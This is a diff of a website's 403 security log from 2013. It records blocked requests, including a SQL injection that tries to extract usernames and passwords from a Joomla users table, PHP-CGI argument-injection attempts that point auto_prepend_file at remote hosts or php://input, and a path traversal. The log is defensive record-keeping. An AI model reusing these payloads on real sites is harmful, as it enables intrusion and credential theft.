@@ -353,100 +353,510 @@ REQUEST_URI: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/
 QUERY_STRING: 
 HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9) Gecko/2008052906 Firefox/3.0
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Май 21, 2013 - 12:31 дп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Mischelin
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Май 22, 2013 - 7:51 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.33.80.217
+Host Name: 178.33.80.217
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
 HTTP_X_FORWARDED_FOR: 
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
-HTTP_REFERER: https://localhost/holybunch_prep/wp-admin/post.php?post=10&action=edit&message=1
-REQUEST_URI: /holybunch_prep/wp-admin/post.php?_ajax_linking_nonce=404d435084&href=&linktitle=%D0%A1%D0%BC%D0%BE%D1%82%D1%80%D0%B5%D1%82%D1%8C%3E%3E&wp-link-submit=%D0%94%D0%BE%D0%B1%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D1%83
+HTTP_REFERER: 
+REQUEST_URI: /?option=com_kunena&func=userlist&search=%25%27+and+1=2%29+union+select+1,2,concat0x3a,username,0x3a,password,0x3a,3,4,5,6,62,1,1,0,0,0,1,15+from+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--+;
+QUERY_STRING: 
+HTTP_USER_AGENT: MySuperBot 1.02
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Май 22, 2013 - 7:51 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.33.80.217
+Host Name: 178.33.80.217
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?option=com_kunena&func=userlist&search=%25%27+and+1=2%29+union+select+1,2,concat0x3a,username,0x3a,password,0x3a,3,4,5,6,62,1,1,0,0,0,1,15+from+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--+;
+QUERY_STRING: 
+HTTP_USER_AGENT: MySuperBot 1.02
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Май 22, 2013 - 7:51 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.33.80.217
+Host Name: 178.33.80.217
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?option=com_kunena&func=userlist&search=%25%27+and+1=2%29+union+select+1,2,concat0x3a,username,0x3a,password,0x3a,3,4,5,6,62,1,1,0,0,0,1,15+from+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--+;
+QUERY_STRING: 
+HTTP_USER_AGENT: MySuperBot 1.02
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Май 22, 2013 - 7:51 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.33.80.217
+Host Name: 178.33.80.217
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?option=com_kunena&func=userlist&search=%25%27+and+1=2%29+union+select+1,2,concat0x3a,username,0x3a,password,0x3a,3,4,5,6,62,1,1,0,0,0,1,15+from+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--+;
+QUERY_STRING: 
+HTTP_USER_AGENT: MySuperBot 1.02
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Май 23, 2013 - 11:50 дп <<<<<<<<<<<
+REMOTE_ADDR: 194.12.64.4
+Host Name: 194.12.64.4
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Май 23, 2013 - 11:51 дп <<<<<<<<<<<
+REMOTE_ADDR: 194.12.64.4
+Host Name: 194.12.64.4
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Май 26, 2013 - 11:49 пп <<<<<<<<<<<
+REMOTE_ADDR: 95.90.8.249
+Host Name: 95-90-8-249-dynip.superkabel.de
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /readme.html
 QUERY_STRING: 
 HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Май 21, 2013 - 12:32 дп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Mischelin
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Май 26, 2013 - 11:53 пп <<<<<<<<<<<
+REMOTE_ADDR: 95.90.8.249
+Host Name: 95-90-8-249-dynip.superkabel.de
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
 HTTP_X_FORWARDED_FOR: 
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
-HTTP_REFERER: https://localhost/holybunch_prep/wp-admin/post.php?post=10&action=edit&message=1
-REQUEST_URI: /holybunch_prep/wp-admin/post.php?_ajax_linking_nonce=404d435084&href=&linktitle=%D0%A1%D0%BC%D0%BE%D1%82%D1%80%D0%B5%D1%82%D1%8C%3E%3E&wp-link-submit=%D0%94%D0%BE%D0%B1%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D1%83
+HTTP_REFERER: 
+REQUEST_URI: /readme.html
 QUERY_STRING: 
 HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Май 21, 2013 - 12:32 дп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Mischelin
-HTTP_CLIENT_IP: 
-HTTP_FORWARDED: 
-HTTP_X_FORWARDED_FOR: 
-HTTP_X_CLUSTER_CLIENT_IP: 
-REQUEST_METHOD: GET
-HTTP_REFERER: https://localhost/holybunch_prep/wp-admin/post.php?post=10&action=edit&message=1
-REQUEST_URI: /holybunch_prep/wp-admin/post.php?_ajax_linking_nonce=404d435084&href=&linktitle=%D0%A1%D0%BC%D0%BE%D1%82%D1%80%D0%B5%D1%82%D1%8C%3E%3E&wp-link-submit=%D0%94%D0%BE%D0%B1%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D1%83
-QUERY_STRING: 
-HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
-
->>>>>>>>>>> 403 GET or Other Request Error Logged - Май 21, 2013 - 12:33 дп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Mischelin
-HTTP_CLIENT_IP: 
-HTTP_FORWARDED: 
-HTTP_X_FORWARDED_FOR: 
-HTTP_X_CLUSTER_CLIENT_IP: 
-REQUEST_METHOD: GET
-HTTP_REFERER: https://localhost/holybunch_prep/wp-admin/post.php?post=10&action=edit&message=1
-REQUEST_URI: /holybunch_prep/wp-admin/post.php?_ajax_linking_nonce=404d435084&href=one-faith.ru&linktitle=%D0%A1%D0%BC%D0%BE%D1%82%D1%80%D0%B5%D1%82%D1%8C%3E%3E&wp-link-submit=%D0%94%D0%BE%D0%B1%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D1%83
-QUERY_STRING: 
-HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
-
->>>>>>>>>>> 403 GET or Other Request Error Logged - Май 21, 2013 - 12:34 дп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Mischelin
-HTTP_CLIENT_IP: 
-HTTP_FORWARDED: 
-HTTP_X_FORWARDED_FOR: 
-HTTP_X_CLUSTER_CLIENT_IP: 
-REQUEST_METHOD: GET
-HTTP_REFERER: https://localhost/holybunch_prep/wp-admin/post.php?post=10&action=edit&message=1
-REQUEST_URI: /holybunch_prep/wp-admin/post.php?_ajax_linking_nonce=404d435084&href=one-faith.ru&linktitle=%D0%A1%D0%BC%D0%BE%D1%82%D1%80%D0%B5%D1%82%D1%8C%3E%3E&wp-link-submit=%D0%94%D0%BE%D0%B1%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D1%83
-QUERY_STRING: 
-HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
-
->>>>>>>>>>> 403 GET or Other Request Error Logged - Май 30, 2013 - 8:14 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 4, 2013 - 3:09 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.163.16
+Host Name: 79.105.163.16
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
 HTTP_X_FORWARDED_FOR: 
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/wp-content/uploads/2013/03/ipad.png
+REQUEST_URI: /
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.5.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Май 30, 2013 - 8:14 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 4, 2013 - 3:10 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.163.16
+Host Name: 79.105.163.16
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
 HTTP_X_FORWARDED_FOR: 
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/wp-content/uploads/2013/03/ipad.png
+REQUEST_URI: /
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.5.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 19, 2013 - 11:48 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 6, 2013 - 11:34 дп <<<<<<<<<<<
+REMOTE_ADDR: 89.70.241.92
+Host Name: 89-70-241-92.dynamic.chello.pl
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 6, 2013 - 11:34 дп <<<<<<<<<<<
+REMOTE_ADDR: 89.70.241.92
+Host Name: 89-70-241-92.dynamic.chello.pl
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 6, 2013 - 1:48 пп <<<<<<<<<<<
+REMOTE_ADDR: 184.72.177.250
+Host Name: ec2-184-72-177-250.compute-1.amazonaws.com
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 10, 2013 - 1:32 пп <<<<<<<<<<<
+REMOTE_ADDR: 23.20.133.134
+Host Name: ec2-23-20-133-134.compute-1.amazonaws.com
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 10, 2013 - 1:49 пп <<<<<<<<<<<
+REMOTE_ADDR: 23.20.133.134
+Host Name: ec2-23-20-133-134.compute-1.amazonaws.com
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 11, 2013 - 7:07 дп <<<<<<<<<<<
+REMOTE_ADDR: 83.139.184.232
+Host Name: 83.139.184.232
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 20, 2013 - 1:15 пп <<<<<<<<<<<
+REMOTE_ADDR: 189.238.213.247
+Host Name: dsl-189-238-213-247-dyn.prod-infinitum.com.mx
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phppath/php?-d+allow_url_include%3d1+-d+safe_mode%3d0+-d+suhosin.simulation%3d1+-d+disable_functions%3d\'\'+-d+open_basedir%3dnone+-d+auto_prepend_file%3dhttp://blackhole.hostenko.com/1.txt+-n
+QUERY_STRING: 
+HTTP_USER_AGENT: MSIE9
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июнь 26, 2013 - 3:29 дп <<<<<<<<<<<
+REMOTE_ADDR: 189.137.21.107
+Host Name: dsl-189-137-21-107-dyn.prod-infinitum.com.mx
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phppath/php?-d+allow_url_include%3d1+-d+safe_mode%3d0+-d+suhosin.simulation%3d1+-d+disable_functions%3d\'\'+-d+open_basedir%3dnone+-d+auto_prepend_file%3dhttp://51zyzg.com/1.txt+-n
+QUERY_STRING: 
+HTTP_USER_AGENT: MSIE9
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 5, 2013 - 4:22 пп <<<<<<<<<<<
+REMOTE_ADDR: 189.231.2.134
+Host Name: dsl-189-231-2-134-dyn.prod-infinitum.com.mx
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phppath/php?-d+allow_url_include%3d1+-d+safe_mode%3d0+-d+suhosin.simulation%3d1+-d+disable_functions%3d\'\'+-d+open_basedir%3dnone+-d+auto_prepend_file%3dhttp://51shetuan.com/1.txt+-n
+QUERY_STRING: 
+HTTP_USER_AGENT: MSIE9
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 6, 2013 - 10:32 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.226.143.114
+Host Name: ec2-54-226-143-114.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 6, 2013 - 10:37 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.227.113.74
+Host Name: ec2-54-227-113-74.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 10, 2013 - 1:34 дп <<<<<<<<<<<
+REMOTE_ADDR: 107.20.11.146
+Host Name: ec2-107-20-11-146.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 10, 2013 - 1:52 дп <<<<<<<<<<<
+REMOTE_ADDR: 107.20.11.146
+Host Name: ec2-107-20-11-146.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 10, 2013 - 3:17 пп <<<<<<<<<<<
+REMOTE_ADDR: 155.56.68.217
+Host Name: 155.56.68.217
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-admin/admin-ajax.php?_ajax_nonce=c7f7588ce8&action=oxy_shortcode_preview&sc=%5Bsection%20title%3D%22%D0%9A%D0%B0%D0%BA%20%D0%B6%D0%B5%20%D1%80%D0%BE%D0%B4%D0%B8%D1%82%D1%8C%D1%81%D1%8F%20%D0%BE%D1%82%20%D0%91%D0%BE%D0%B3%D0%B0%2C%20%D0%BD%D0%B5%D1%83%D0%B6%D0%B5%D0%BB%D0%B8%20%D1%81%D0%BD%D0%BE%D0%B2%D0%B0%20%D0%B2%D0%BE%D0%B9%D1%82%D0%B8%20%D0%B2%20%D1%83%D1%82%D1%80%D0%BE%D0%B1%D1%83%20%D0%BC%D0%B0%D1%82%D0%B5%D1%80%D0%B8....%22%5D%5B%2Fsection%5D
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 10, 2013 - 3:17 пп <<<<<<<<<<<
+REMOTE_ADDR: 155.56.68.217
+Host Name: 155.56.68.217
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-admin/admin-ajax.php?_ajax_nonce=c7f7588ce8&action=oxy_shortcode_preview&sc=%5Bsection%20title%3D%22%D0%9A%D0%B0%D0%BA%20%D0%B6%D0%B5%20%D1%80%D0%BE%D0%B4%D0%B8%D1%82%D1%8C%D1%81%D1%8F%20%D0%BE%D1%82%20%D0%91%D0%BE%D0%B3%D0%B0%2C%20%D0%BD%D0%B5%D1%83%D0%B6%D0%B5%D0%BB%D0%B8%20%D1%81%D0%BD%D0%BE%D0%B2%D0%B0%20%D0%B2%D0%BE%D0%B9%D1%82%D0%B8%20%D0%B2%20%D1%83%D1%82%D1%80%D0%BE%D0%B1%D1%83%20%D0%BC%D0%B0%D1%82%D0%B5%D1%80%D0%B8....%22%5D%5B%2Fsection%5D
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 10, 2013 - 3:18 пп <<<<<<<<<<<
+REMOTE_ADDR: 155.56.68.217
+Host Name: 155.56.68.217
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-admin/admin-ajax.php?_ajax_nonce=c7f7588ce8&action=oxy_shortcode_preview&sc=%5Bsection%20title%3D%22%D0%9A%D0%B0%D0%BA%20%D0%B6%D0%B5%20%D1%80%D0%BE%D0%B4%D0%B8%D1%82%D1%8C%D1%81%D1%8F%20%D0%BE%D1%82%20%D0%91%D0%BE%D0%B3%D0%B0%2C%20%D0%BD%D0%B5%D1%83%D0%B6%D0%B5%D0%BB%D0%B8%20%D1%81%D0%BD%D0%BE%D0%B2%D0%B0%20%D0%B2%D0%BE%D0%B9%D1%82%D0%B8%20%D0%B2%20%D1%83%D1%82%D1%80%D0%BE%D0%B1%D1%83%20%D0%BC%D0%B0%D1%82%D0%B5%D1%80%D0%B8....%22%20style%3D%22gray%22%5D%5B%2Fsection%5D
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 11, 2013 - 2:08 дп <<<<<<<<<<<
+REMOTE_ADDR: 54.226.240.118
+Host Name: ec2-54-226-240-118.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 11, 2013 - 2:26 дп <<<<<<<<<<<
+REMOTE_ADDR: 54.226.240.118
+Host Name: ec2-54-226-240-118.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 12, 2013 - 2:05 дп <<<<<<<<<<<
+REMOTE_ADDR: 54.227.55.88
+Host Name: ec2-54-227-55-88.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 13, 2013 - 6:58 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.161.128
+Host Name: 79.105.161.128
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 13, 2013 - 6:59 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.161.128
+Host Name: 79.105.161.128
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 15, 2013 - 10:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 146.120.112.34
+Host Name: s026.rservers.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?-n+-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp%3a%2f%2finput
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.75 Safari/537.1
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 15, 2013 - 10:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 146.120.112.34
+Host Name: s026.rservers.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?-n+-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp%3a%2f%2finput
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.75 Safari/537.1
